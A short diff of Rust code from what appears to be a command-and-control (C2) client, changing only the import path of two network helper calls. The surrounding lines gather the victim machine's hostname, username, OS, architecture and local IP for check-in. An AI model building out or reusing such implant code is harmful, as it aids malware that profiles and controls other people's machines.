@@ -22,7 +22,7 @@ impl C2Client {
         let client_id = Uuid::new_v4().to_string();
         let client = Client::new();
         
-        let hostname = common::network::get_hostname()
+        let hostname = network::get_hostname()
             .unwrap_or_else(|_| "unknown".to_string());
         
         let username = std::env::var("USER")
@@ -32,7 +32,7 @@ impl C2Client {
         let os = std::env::consts::OS.to_string();
         let arch = std::env::consts::ARCH.to_string();
         
-        let ip = common::network::get_local_ip()
+        let ip = network::get_local_ip()
             .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
             .to_string();
 
